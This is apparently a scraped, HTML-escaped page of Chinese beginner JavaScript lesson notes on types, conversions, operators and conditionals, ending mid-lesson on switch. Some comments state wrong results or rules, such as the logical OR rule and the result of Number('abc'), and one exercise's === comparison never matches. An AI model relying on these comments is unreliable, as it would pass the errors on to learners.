http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Boolean&lt;/title&gt; &lt;script&gt; /* Boolean：布尔值 只有两个值：true / false，用来做逻辑判断 */ var bool = true; console.log(bool); console.log(typeof bool); // boo;ean &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 010 Null 和 Undefined123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Null 和 Underfined&lt;/title&gt; &lt;script&gt; /* Null类型的值只有一个，就是null，null这个值专门用来表示一个为空的对象，使用typeof 检查一个null值时，会返回object Underfined类型的值只有一个，就是underfined 当声明一个变量，但是不给变量赋值，它的值就是undefined 使用typeof检查undefined，将会返回underfined */ console.log(typeof null); // 输出object var a; console.log(a); // undefined console.log(typeof a); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 011 强制类型转换-String1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;强制类型转换-String&lt;/title&gt; &lt;script&gt; /* 强制类型转换 - 指将一个数据类型强制转换为其他数据类型 - 类型转换主要指，将其他数据类型转换为 String Number Boolean */ /* 将其他数据类型转换为String 方式一： - 调用被转换数据类型的toString()方法 - 该方法不会影响到原变量，它会将转换的结果返回 - 但是注意：null和undefined这两个值没有toString()方法，如果调用就会报错 方式二： - 调用String函数，并将被转换的数据作为参数传递给函数 - 使用String()做强制类型转换时， 对于Number和Boolean实际就是调用的toString()方法 但是对于null 和 undefined，就不会调用toString()方法，它会直接转换为&quot;null&quot;和&quot;undefined&quot; */ var a = 123; console.log(typeof a); // 调用a的toString()方法 // 调用xxxx的yyy()方法，就是xxx.yyy() var b = a.toString(); console.log(b); console.log(typeof b); // string a = true; a = a.toString(); console.log(a); // true console.log(typeof a); a = null; // a = a.toString(); // 报错 a = undefined; // a = a.toString(); // 报错 a = 123; // 调用String()函数，来将a转换为字符串 a = String(a); console.log(a); console.log(typeof a); // string a = null; a = String(a); console.log(a); // null console.log(typeof a); // String a = undefined; a = String(a); console.log(a); // undefined console.log(typeof a); // string &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 012 强制类型转换-Number1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;强制类型转换-Number&lt;/title&gt; &lt;script&gt; /* 将其他的数据类型转换为Number - 转换方式一： 使用Number()函数 - 字符串 ===&gt; 数字 1. 如果是纯数字的字符串，则直接将其转换为数字 2.如果字符串中有非数字的内容，则转换为NaN 3.如果字符串是一个空串，或者是一个全是空格的字符串，则转换为0 - 布尔值 === &gt; 数字 true 转换为 1 false 转换为 0 - Null ===&gt; 数字0 - undefined ===&gt; 数字NaN - 转换方式二： - 这种方式专门用来对付字符串 - parseInt() 把字符串转换为一个整数 - parseFloat()把一个字符串转换为一个浮点数 */ var a = &quot;123&quot;; console.log(a); console.log(typeof a); // 调用函数Number()函数来将a转换为Number类型 a = Number(a); console.log(a); console.log(typeof a); a = Number(&quot;abc&quot;); console.log(a); // Number console.log(typeof a); a = &quot; &quot;; a = Number(a); console.log(a); // 0 console.log(typeof a); // number a = true; a = Number(a); b = false; b = Number(b) console.log(b); console.log(a); console.log(typeof a); a = null; console.log(typeof a); // object a = Number(a); console.log(a); a = undefined; a = Number(a); console.log(a); // NaN a = &quot;123px12&quot;; // 调用parseInt()函数将a转换为Number /* parseInt()可以将一个字符串中有效的整数内容取出，然后转换为Number parseFloat()作用和parseInt类似，不同的是，它可以获取有效小数 */ a = parseInt(a); console.log(a); // 123 console.log(typeof a); a = &quot;123.567px1222&quot;; a = parseFloat(a); console.log(a); // 123.567 console.log(typeof a); /* 如果对非String使用parseInt()或parseFloat() 它会先将其转换为String，然后再操作 */ a = true; a = parseInt(a); console.log(a); // NaN console.log(typeof a); // parseInt()可以将一个字符串中的有效整数内容取出来 a = 198.123; a = parseInt(a); console.log(a); console.log(typeof a); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 013 其他进制的数字1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;其他进制的数字&lt;/title&gt; &lt;script&gt; var a = 123; console.log(a); /* 在js中，如果需要表示16进制数字，则需要以0x开头 如果需要表示8进制的数字，则需要以0开头 如果要表示2进制数字，则需要以0b开头，但是不是所有浏览器都支持 */ a = 0x10; console.log(a); // 16 a = 070; console.log(a); // 56 a = 0b10; console.log(a); // 2 // 像&quot;070&quot;这种字符串，有些浏览器会当成8进制解析，有些会当成10进制解析 a = &quot;070&quot;; // 可以在parseInt()中传递一个第二参数，来指定数字的进制，但是并不常用 a = parseInt(a, 10); console.log(a); // 70 console.log(typeof a); a = parseInt(a, 8); console.log(a); // 56 console.log(typeof a); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 014 转换为Boolean1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;转换为Boolean&lt;/title&gt; &lt;script&gt; /* 将其他的数据类型转换为Boolean - 使用Boolean()函数 - 数字 ===&gt; 布尔值 - 除了0和NaN，其余全是true - 字符串 ===&gt; 布尔值 - 除了空串，其余的都是true - null和undefined都会转换为false - 对象也会转换为true */ // 调用Boolean()函数来将a转换为布尔值 var a = 123; a = Boolean(a); console.log(a); // true a = -123; a = Boolean(a); console.log(a); // true a = Infinity; a = Boolean(a); console.log(a); // true a = 0; a = Boolean(a); console.log(a); // false a = null; a = Boolean(a); console.log(a); // false a = undefined; a = Boolean(a); console.log(a); // false a = NaN; a = Boolean(a); console.log(a); // false a = &quot;&quot;; a = Boolean(a); console.log(a); // false a = &quot; &quot;; a = Boolean(a); console.log(a); // true a = &quot;zhulan&quot;; a = Boolean(a); console.log(a); // true &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 015 算数运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;算数运算符&lt;/title&gt; &lt;script&gt; /* 运算符也叫操作符 通过运算符可以对一个或多个值进行运算，并获取运算结果 比如：typeof就是运算符，可以来获得一个值的类型 它会将该值的类型以字符串的形式返回 number boolean undefined object string 算数运算符 + - * / % 当对非Number类型的值进行运算时，会将这些值转换成Number，然后将结果返回 - 任何值和NaN做运算都得到NaN - 如果对两个字符串进行加法运算，则会做拼串，将两个字符串拼接为一个字符串，并返回 - 任何的值和字符串做加法运算，都会先转换为字符串，然后再和拼串操作 */ var a = 123; var res = typeof a; console.log(res); // number console.log(typeof res); // string a = true + 1; console.log(a); // 2 a = true + false; console.log(a);// 0 a = null + 2; console.log(a); // 2 a = 2 + NaN; console.log(a); // NaN a = &quot;123&quot; + &quot;456&quot;; console.log(a); //123456 console.log(typeof a); // string a = 1 + &quot;123&quot;; console.log(a); console.log(typeof a); // 任何值和字符串相加都会转换为字符串，并做拼串操作 a = true + &quot;123&quot;; console.log(a); // true123 // 可以利用这一特点，来将一个任意的数据类型转换为String，我们只需要为任意的数据类型加一个&quot;&quot;，即可将其转换为String，这是一种隐式的类型转换，由浏览器自动完成，实际上它也是调用String()函数， a = 123 + &quot;&quot;; // 等价于a = String(a); console.log(a); console.log(typeof a); a = 1 + 2 + &quot;3&quot;; console.log(a); // 33 a = 1 + &quot;2&quot; + &quot;3&quot;; console.log(a); // 123 /* 任何值做 - * / 运算时，都会自动转换为Number 我们可以利用这一特点做隐式的类型转换为Number 原理和Number()函数一样，使用起来更加简单 */ a = 100 - 5; console.log(a); // 95 a = 100 - true; console.log(a); // 99 a = 100 - &quot;1&quot;; console.log(a); // 99 a = &quot;123&quot; - 0; console.log(a); // 123 console.log(typeof a); //number a = 2 * &quot;8&quot;; console.log(a); // 16 a = 2 * null; console.log(a); //0 a = 2 * undefined; console.log(a); // NaN a = 100 % 3; console.log(a); // 1 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 016 一元运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;一元运算符&lt;/title&gt; &lt;script&gt; /* 一元运算符：只需要一个操作数 + ：不会对数字运算结果产生影响 - ：符号可以对数字进行符号的取反 对于非Number类型，它会先将其转换为Number，然后再进行运算。 可以对一个其他的数据类型使用+，来将其转换为Number，原理和Number()函数一致 */ var a = 1; a = +a; console.log(a); a = -a; console.log(a); a = true; a = -a; console.log(a); // -1 a = &quot;18&quot;; a = +a; console.log(a); // +18 console.log(typeof a); // number a = 1 + +&quot;2&quot; + 3; console.log(a); // 6 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 017 自增和自减1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;自增和自减&lt;/title&gt; &lt;script&gt; /* 自增 - 通过自增可以使得变量在自身基础上增加1 - 自增分为两种：后++，和前++，a++ / ++a - 无论是++a / a++，都会立即使得原变量加1 不同的是，a++和++a的值不同 - a++的值等于原变量的值(自增前的值)，a--的值等于(自增后的值) - 通过自减可以使变量在自身的基础上减1 - 类比自增 */ var a = 1; a++; //使a自增1 console.log(a); // 2 ++a; console.log(a); // 3 a--; console.log(a); // 2 a = 1; console.log(a++); // 1 console.log(++a);// 3 a = 100; var res = a++ + ++a + a; console.log(res); // 304 a = 1 a = a++; console.log(a); // 1 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 019 逻辑运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;逻辑运算符&lt;/title&gt; &lt;script&gt; /* JS中为我们提供了三种逻辑运算符 ! 非：所谓非运算就是对一个布尔值进行取反操作，true变false，false变true，两次取反真假不变 我们可以利用该特点，来将一个数据类型转换为布尔值，可以对任意一个数据类型取反两次，来将其转换为布尔值原理和Boolean()函数一样 &amp;&amp; 与：&amp;&amp;可以对符号两侧的值进行运算并返回结果 运算规则：有假得假，全真为真 JS中的“与”属于短路与，如果第一个值为false，则不会再看第二个值 || 或：||可以对符号两端的值进行运算并返回结果 运算规则：全真则真，一假则假 JS中的“或”属于短路或，如果第一个值为真，则不会再判定第二个值 */ var a = true; a = !a; console.log(a); // false console.log(!10); // false console.log(!null); // true console.log(!undefined); // true console.log(!&quot;&quot;); // true console.log(!&quot;a&quot;); // false console.log(true &amp;&amp; true); // true console.log(true &amp;&amp; false); // false console.log(false &amp;&amp; true); // false console.log(false &amp;&amp; false); // false true &amp;&amp; console.log(&quot;执行打印1&quot;) // 输出 false &amp;&amp; console.log(&quot;执行打印2&quot;) // 没有输出 console.log(true || true); // true console.log(true || false); // true console.log(false || false); // false true || console.log(&quot;执行打印3&quot;); // 未输出 false || console.log(&quot;执行打印4&quot;); // 输出 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 020 非布尔值的与或运算1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;非布尔值的与或运算&lt;/title&gt; &lt;script&gt; /* &amp;&amp; || 非布尔值的情况 - 对于非布尔值进行与或运算时，会将其转换为布尔值，然后再进行运算，并且返回原值！！！ - 与运算： - 如果第一个值为true，则返回第二个值 - 如果第一个值为false，则直接返回第一个值 - 或运算： - 如果第一个值为true，则直接返回第一个值 - 如果第一个值为false，则直接返回第二个值 */ // 与运算：如果两个值均为true，则返回后面的 var res = 1 &amp;&amp; 2; console.log(res); // 2 // 与运算：如果两个值中有false，则返回靠前的false res = 0 &amp;&amp; 1; console.log(res); // 0 res = NaN &amp;&amp; 0; console.log(res); // NaN res = 0 &amp;&amp; NaN; console.log(res); // 0 // 或运算：如果第一个值为true，则直接返回第一个值 // 如果第一个值为false，则直接返回第二个值 res = 2 || 1; console.log(res); // 2 res = NaN || 0; console.log(res); // 0 res = 0 || NaN; console.log(res); // NaN &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 021 赋值运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;赋值运算符&lt;/title&gt; &lt;script&gt; /* =：可以将符号右侧的值赋值给符号左侧的变量 += / -= / *= / /= / %=： */ var a = 0; a += 5; // 等价于a = a+5 console.log(a); // 5 a %= 3; console.log(a); // 2 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 022 关系运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;关系运算符&lt;/title&gt; &lt;script&gt; /* 通过关系运算符可以比较两个值之间的大小关系 如果关系成立则返回true，如果不成立，则返回false &gt; &lt; &gt;= 非数值的情况： - 对于非数值进行比较时，会将其转换为数字，然后再比较 - 任何值和NaN做比较，结果都是false - 如果符号两边的值都是字符串时，不会将其转换为数值进行比较，而会分别比较字符串中的Unicode编码 */ console.log(5 &gt; 10); // false console.log(5 &gt; 4); // true console.log(5 &gt;= 5); // true console.log(1 &gt; true); // false console.log(1 &gt; &quot;0&quot;); // true console.log(10 &gt; null); // true console.log(10 &gt; undefined); //false console.log(10 &lt;= undefined); //false console.log(10 &gt; &quot;hello&quot;); // false console.log(NaN == NaN); // false console.log(NaN === NaN); // false // 比较两个字符串时，比较的是字符串编码 // 比较字符串编码时，是一位一位进行比较的，如果两位一样，则比较下一位，可以对英文实现排序,比较中文时，没有意义 console.log(&quot;11&quot; &lt; &quot;5&quot;); // true console.log(&quot;11&quot; &gt; &quot;5&quot;); // false console.log(&quot;a&quot; &lt; &quot;b&quot;); // true console.log(&quot;a&quot; &gt; &quot;b&quot;); // false console.log(&quot;bbc&quot; &gt; &quot;b&quot;); // true // 如果比较的两个字符串类型的数字，可能会得到不可预期的结果 // 注意：在比较两个字符串类型的数字时，一定一定要转型 console.log(&quot;11111111&quot; &lt; &quot;5&quot;); // true console.log(&quot;11111111&quot; &lt; +&quot;5&quot;); // false &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 023 Unicode编码1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Unicode编码&lt;/title&gt; &lt;script&gt; /* 在字符串中使用转义字符输出Unicode编码 \\u 四位编码,注意，此处的编码是16进制的，而在网页标签上使用，应该将他转换为10进制 */ console.log(&quot;\\u0031&quot;); // 1 console.log(&quot;\\u2620&quot;); // ☠ console.log(&quot;\\u2623&quot;); // ☣ &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 在网页中使用Unicode编码 &amp;#编码；是十进制数字 --&gt; &lt;h1&gt;&amp;#9763;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 024 相等运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;相等运算符&lt;/title&gt; &lt;script&gt; /* 相等运算符用来比较两个值是否相等 如果相等，会返回true，否则返回false 使用 == 来表示相等运算 - 当使用 == 来比较两个值时，如果值的类型不同，则会自动进行类型转换，将其转换为相同类型的值，然后再进行比较 不相等 不相等用来判断两个值是否相等，如果不相等返回true，否则返回false - 使用 != 来做不相等运算 - 不相等也会对变量进行自动的类型转换，如果转换后相等，也会返回false === 全等 - 用来判断是否全等，和相等类似，不同的是，它不会做自动的类型转换，如果两个值的类型不同，直接返回false !== 不全等 - 用来判断两个值是否不全等，和不等类似，不同的是，它不会做自动类型转换，如果两个值类型不同，将直接返回true */ console.log(1 == 1); // true // 不同类型之间的比较 console.log(&quot;1&quot; == 1); // true console.log(true == &quot;1&quot;); // true console.log(null == 0); // false /* undefined衍生自null，所以这两个值做相等判断时，将会返回true */ console.log(null == undefined); // true /* NaN不和任何值相等，包括它本身 */ console.log(NaN == NaN); // false var b = NaN; // 需求：判断b的值是否是NaN /* 可以利用isNaN()函数来判断一个值是否是NaN 是NaN，返回true；否则返回false */ console.log(isNaN(b)); // true console.log(10 != 5); // true console.log(1 != 1); // false console.log(&quot;1&quot; != 1); // false console.log(&quot;123&quot; === 123); // false console.log(null === undefined); // false &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 025 条件运算符1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;条件运算符&lt;/title&gt; &lt;script&gt; /* 条件运算符也叫三元运算符 语法：条件表达式?语句1:语句2; - 执行流程： 条件运算符在执行时，首先对表达式进行求值 如果该值为true，则执行表达式1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件表达式的求值结果是一个非布尔值，会将其转换为布尔值，然后再运算 */ true ? console.log(&quot;执行语句1&quot;) : console.log(&quot;执行语句2&quot;); false ? console.log(&quot;执行语句1&quot;) : console.log(&quot;执行语句2&quot;); // 获取a b c 中的最大值 var a = 100, b = 200, c = 300; var max; // 不推荐使用，但是不方便阅读 // max = a &gt; b ? (a &gt; c ? a : c) : (b &gt; c ? b : c); // 300 console.log(max); &quot;&quot; ? console.log(&quot;执行语句1&quot;) : console.log(&quot;执行语句2&quot;); // 2 &quot;hello&quot; ? console.log(&quot;执行语句1&quot;) : console.log(&quot;执行语句2&quot;); // 1 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 026 运算符的优先级 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;运算符的优先级&lt;/title&gt; &lt;script&gt; /* ,运算符 使用,可以分割多个语句，一般可以在声明多个变量时使用，可以同时声明多个变量值并赋值 */ // var a = 1, b = 2, c = 3; /* 就和数学中一样，JS中运算符也有优先级 比如：先乘除后加减 在JS中，有一个运算符优先级的表，在表中，越靠上的优先级越高，优先级越高越先计算，如果优先级相同，则从左往右计算 但是该表我们不需要去记忆，遇到优先级不确定的情况，可以使用()来改变优先级！！！ */ var res = 1 + 2 * 3; console.log(res); // 7 /* 如果||的优先级高，或者两个一样高，则返回 3 如果&amp;&amp;的优先级高，则返回1 */ res = 1 || 2 &amp;&amp; 3; console.log(res); // 1，说明&amp;&amp;优先级高 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 027 代码块1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;代码块&lt;/title&gt; &lt;script&gt; /* 我们的程序是由一条一条语句构成的 语句是按照自上而下的顺序一条一条执行的 在JS中可以使用&#123;&#125;来为语句进行分组 同一个&#123;&#125;中的语句我们称为是一组语句 它们要么都执行，要么都不执行 一个&#123;&#125;中的语句我们也称为一个代码块 在代码块的后边就不用写分号了 JS中的代码块只具有分组的作用，没有其他的用途 代码块内的内容，在外部是完全可见的 */ &#123; alert(&quot;你好&quot;); console.log(&quot;hello&quot;); document.write(&quot;你好&quot;); var a = 10; &#125; console.log(a); // 10 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 028 if语句(一)1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;流程控制语句&lt;/title&gt; &lt;script&gt; /* 流程控制语句 - JS中的程序是从上到下一行一行执行的 - 通过流程控制语句可以控制程序执行流程，使程序可以根据一定的条件来选择执行 - 语句的分类： 1.条件判断语句 2.条件分支语句 3.循环语句 条件判断语句 - 使用条件判断语句可以在执行某个语句之前进行判断，如果条件成立，才会执行语句，条件不成立就不执行语句 - if 语句 if(条件表达式) 语句 if语句在执行是，会先对条件表达式进行求值判断，如果表达式的值为true，则执行if后的语句，如果表达式的值为false，则不会执行if后的语句 if语句只能控制其紧随其后的语句，如果希望if语句可以控制多条语句，可以将这些语句统一放在一个代码块中 if语句后面的代码块不是必须的，但是开发中尽量写上代码块，即使if语句后只有一条语句 */ var a = 15; if (a &gt; 10 &amp;&amp; a &lt; 20) &#123; console.log(a); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 029 if语句(二)1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;if语句&lt;/title&gt; &lt;script&gt; /* if语句 语法二： if(条件表达式)&#123; 语句…… &#125;else&#123; 语句…… &#125; if……else……语句 当该语句执行时，会先对if后的条件表达式进行求值判断 如果该值为true，则执行if后的语句 如果该值为false，则执行else后的语句 语法三： if(条件表达式)&#123; 语句…… &#125;else if(条件表达式)&#123; 语句…… &#125;else&#123; 语句…… &#125; if……else if……else 当该语句执行时，会自上而下依次对条件表达式进行求值判断 如果为true，则执行当前语句； 如果为false，则继续向下判断, 如果所有条件都不满足，则执行最后一个else后的语句 该语句中，只会有一个代码块被执行，一旦代码块被执行了，则直接结束语句 */ var age = 15; if (age &lt; 35 &amp;&amp; age &gt; 22) &#123; console.log(&quot;还要继续996&quot;); &#125; else if (age &gt;= 35) &#123; console.log(&quot;可以退休了&quot;); &#125; else &#123; console.log(&quot;摆烂&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 030 - 032 练习1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习&lt;/title&gt; &lt;script&gt; /* prompt()可以弹出一个提示框，该提示框会带有一个文本框，用户可以在文本框中输入一段内容，该函数需要一个字符串作为参数，该字符串将会作为该提示框的提示文字 用户输入的内容将会作为函数的返回值返回，可以定义一个变量来接收该变量 */ var scores; scores = prompt(&quot;请输入期末成绩（0-100）：&quot;); if (isNaN(scores) || scores &gt; 100 || scores &lt; 0) &#123; console.log(&quot;输入不合法！&quot;); &#125; else if (scores === 100) &#123; console.log(&quot;奖励一辆BMW&quot;); &#125; else if (scores &gt;= 80) &#123; console.log(&quot;奖励一台iphone13 pro Max&quot;); &#125; else if (scores &gt;= 60) &#123; console.log(&quot;奖励一本资料&quot;); &#125; else &#123; console.log(&quot;没有奖励&quot;); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;练习二&lt;/title&gt; &lt;script&gt; /* 注意prompt()函数的返回值一定是String类型的 在使用isNaN()函数时，对于字符串数字检查后也会返回false，所以可以利用+运算符将输入转换为数字 */ var a = +prompt(&quot;数字1：&quot;); var b = +prompt(&quot;数字2：&quot;); var c = +prompt(&quot;数字3：&quot;); var a1, b1, c1; if (isNaN(a) || isNaN(b) || isNaN(c)) &#123; console.log(&quot;输入不合法！&quot;); &#125; else &#123; console.log(a &gt; b ? (a &gt; c ? a : c) : (b &gt; c ? b : c), a &gt; b ? (b &gt; c ? b : (a &gt; c ? c : a)) : (b &lt; c ? b : (a &lt; c ? c : a)), a &lt; b ? (a &gt; c ? c : a) : (b &gt; c ? c : b)); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 033 条件分支语句1&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;条件分支语句&lt;/title&gt; &lt;script&gt; /* 条件分支语句switch语句 switch(条件表达式)&#123; case 表达式: 语句…… break; case 表达式: 语句…… break; case 表达式: 语句…… break; default: 语句……; break; &#125; 执行流程： switch……case……语句 在执行时，会依次将case后面的表达式和switch后的条件表达式的值进行全等比较，如果比较结果为true，则从当前case处开始执行代码 当前case后所有的代码，都会被执行，所以最好在每一个case语句后面使用break及时退出switch语句，这样可以确保只会执行当前case后的语句，而不会执行其他的语句 如果比较结果为false，则继续向下比较。 如果所有的比较结果都是false，则只会执行default之后的语句。 